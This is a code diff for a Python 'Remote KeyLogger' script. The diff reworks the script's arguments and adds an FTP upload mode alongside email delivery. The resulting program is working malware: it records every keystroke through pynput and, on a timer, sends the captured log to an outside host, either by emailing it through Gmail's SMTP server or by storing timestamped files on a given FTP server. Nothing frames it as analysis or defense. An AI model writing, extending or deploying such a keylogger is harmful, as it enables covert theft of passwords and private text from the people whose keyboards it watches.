@@ -1,57 +1,92 @@
 #!/usr/bin/env python
+
 import argparse
-import pynput.keyboard
-import threading
+from datetime import datetime
+import ftplib
+import io
+from pynput.keyboard import Listener, Key, KeyCode
 import smtplib
+import sys
+import threading
+from typing import Optional
+
+parser = argparse.ArgumentParser()
+parser.add_argument("mode", choices=["ftp", "smtp"])
+parser.add_argument("login", help="Username for FTP/email for SMTP")
+parser.add_argument("password", help="Password for FTP user/email account")
+parser.add_argument(
+    "-s", "--server", help="Required for FTP (default smtp.gmail.com for SMTP)"
+)
+parser.add_argument(
+    "-t",
+    "--time",
+    type=int,
+    help="time interval required seconds like -t 60",
+    required=True,
+)
+parser.add_argument(
+    "-p",
+    "--port",
+    type=int,
+    help="Port to connect to (default 21 for FTP, OS-dependent for SMTP)",
+)
+args = parser.parse_args()
+
+mode = args.mode
+login = args.login
+password = args.password
+time_interval = args.time
+port: Optional[int] = args.port
+
+if args.server:
+    server = args.server
+elif args.mode == "smtp":
+    server = "smtp.gmail.com"
+else:
+    print("--server required for FTP", file=sys.stderr)
+    exit(1)
+
 
 class Keylogger:
-    def __init__(self, time_interval, email, password ):
+    def __init__(self):
         self.log = "Keylogger Started"
-        self.interval = time_interval
-        self.email = email
-        self.password = password
-    
-    def append_to_log(self, string):
-        self.log = self.log + string
 
-    def process_key_press(self, key): #call back function
+    def process_key_press(self, key: Optional[Key | KeyCode]):  # call back function
         try:
-            current_key =  str(key.char)
+            current_key = str(key.char)
         except AttributeError:
-            if key == key.space:
-                current_key =  " "
+            if key == Key.space:
+                current_key = " "
             else:
-                current_key =  " " + str(key) + " "
-        self.append_to_log(current_key)
-        
+                current_key = " " + str(key) + " "
+        self.log += current_key
+
     def report(self):
-        self.finalog = '\n\n' + self.log
-        self.send_mail(self.email, self.password, self.finalog)
+        print(self.log)
+        if mode == "smtp":
+            with smtplib.SMTP("smtp.gmail.com", port=port or 0) as smtp:
+                smtp.starttls()
+                smtp.login(login, password)
+                smtp.sendmail(login, login, "\n\n" + self.log)
+        else:
+            with ftplib.FTP() as ftp:
+                ftp.connect(server, port=port or 0)
+                ftp.login(user=login, passwd=password)
+                ftp.mkd("storage")
+                ftp.cwd("storage")
+                now = datetime.now()
+                ftp.storbinary(f"STOR {now.isoformat()}", io.BytesIO(self.log.encode()))
         self.log = ""
-        timer = threading.Timer(self.interval, self.report)
+        timer = threading.Timer(time_interval, self.report)
         timer.start()
-    
-    def send_mail(self,email, password, message):
-        server = smtplib.SMTP("smtp.gmail.com",587)
-        server.starttls()
-        server.login(email,password)
-        server.sendmail(email, email, message)
-        server.quit()
-    
+
     def start(self):
-        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        keyboard_listener = Listener(on_press=self.process_key_press)
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
 
-parser = argparse.ArgumentParser()
-parser.add_argument('--time',type=int, help = "time interval required seconds like -t 60", required=True)
-parser.add_argument('--mail', help = "Mail requrired to Report for keylogs", required=True)
-parser.add_argument('--password', help = "mail account password required",required=True)
-args = parser.parse_args()
-time = args.time
-mail = args.mail
-password = args.password
+
 print("Remote KeyLogger Running....")
-my_keylogger = Keylogger(time, mail, password)
-my_keylogger.start()
+keylogger = Keylogger()
+keylogger.start()
